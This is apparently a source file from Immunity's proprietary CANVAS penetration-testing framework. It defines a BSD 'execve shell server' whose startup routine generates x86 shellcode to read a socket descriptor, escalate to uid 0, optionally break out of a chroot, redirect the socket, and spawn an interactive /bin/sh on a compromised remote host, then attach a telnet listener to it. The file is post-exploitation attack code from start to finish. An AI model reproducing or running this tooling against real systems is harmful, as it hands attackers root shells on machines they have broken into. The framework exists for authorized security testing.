#! /usr/bin/env python

"""
Wrapper for BSD MOSDEF ShellServer and Execve ShellServer
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information


from shellserver import unixshellserver
from MOSDEFShellServer import MosdefShellServer, MSSgeneric
from exploitutils import *
from shellcode import shellcodeGenerator
from shelllistener import shelllistener

# XXX: old code ..
class execveshellserver(MSSgeneric, unixshellserver, shelllistener): 
    """
    XXX: this code is pretty much deprecated .. can we take it out soon?
    """
     
    def __init__(self,connection,node,logfunction=None, proctype='i386'):
        unixshellserver.__init__(self,connection,node,type="Active",logfunction=logfunction)
        self.arch = "x86"
        MSSgeneric.__init__(self)
        self.order = intel_order
        self.unorder = istr2int
        self.node = node
        self.node.shell = self
        self.setconstants()
     
    def setconstants(self):
        self.SO_REUSEADDR=2
     
    def startup(self):
        """
        Startup a /bin/sh
        """
        from libs.ctelnetlib import Telnet
        if self.started:
             return
        
        self.log("Startup...")
        try:
             #for timeoutsocket
             self.connection.set_timeout(None)
        except:
             self.log("Not using timeoutsocket on this node")
        
        sc = shellcodeGenerator.bsd_X86()
        sc.addAttr("sendreg",{"fdreg":"ebx","regtosend":"ebx"})
        sc.addAttr("read_and_exec",{"fdreg":"ebx"})
        getfd = sc.get()
        self.sendrequest(getfd)
        #now read in our little endian word that is our fd (originally in ebx)
        self.fd = self.readword()
        self.log("Self.fd --> %d"%self.fd)
        
        sc = shellcodeGenerator.bsd_X86()

        if self.initstring.count("whileone"):
            sc.addAttr("whileone", None)
        sc.addAttr("Normalize Stack",[500])          
                  
        sc.addAttr("setuid",[0])
        sc.addAttr("setreuid",[0,0])
        sc.addAttr("setuid",[0])
        if self.initstring.count("chrootbreak"):
            self.log("Doing a chrootbreak")
            sc.addAttr("chrootbreak",None)
        sc.addAttr("dup2",[self.fd])
        sc.addAttr("setuid",None)
        #myshellcode.addAttr("debugme",None)
        sc.addAttr("execve",{"argv": ["/bin/sh","-i"],"envp": [],"filename": "/bin/sh"})
        
        self.log("Sent execve...")  
        mainloop = sc.get()
        self.sendrequest(mainloop)
        telnetshell = Telnet()
        telnetshell.sock=self.connection
        print "Setting up shell listener."
        shelllistener.__init__(self,telnetshell,logfunction=self.logfunction)
        print "Set up shell listener"

        #ok, now our mainloop code is running over on the other side
        self.log("Set up BSD shell server")
        #self.sendrequest(mainloop)
        self.started = 1
        return 1
     
    
    def sendrequest(self,request):
        """
        sends a request to the remote shellcode
        """
        devlog('shellserver::sendrequest', "Sending Request")
        self.requestsize = len(request)
        request = self.order(len(request))+request
        #print "R: "+prettyprint(request)
        #is this reliable?!?
        #self.enter() ??? Do we need this here ???
        self.node.parentnode.send(self.connection,request)
        devlog('shellserver::sendrequest', "Done sending request")
        return
     
    def readword(self):
        """ read one word off our stream
        XXX: needs to be changed.
        """
        data = ""
        while len(data)<4:
            tmp = self.node.parentnode.recv(self.connection,1)
            if tmp == "":
                self.log("Connection broken?!?")
                break
            data+=tmp
        #print "read 4 bytes: %s"%prettyprint(data)
        return self.unorder(data)
            
    def setListenPort(self,port):
        self.listenport = port
        return
   
def bsdshellserver(*args, **kargs):
    print """

    WARNING bsdshellserver called, you should replace it by MosdefShellServer('BSD', 'i386') ...

    """

    _bsdshellserver = MosdefShellServer('BSD', 'i386')
    return _bsdshellserver(*args, **kargs)
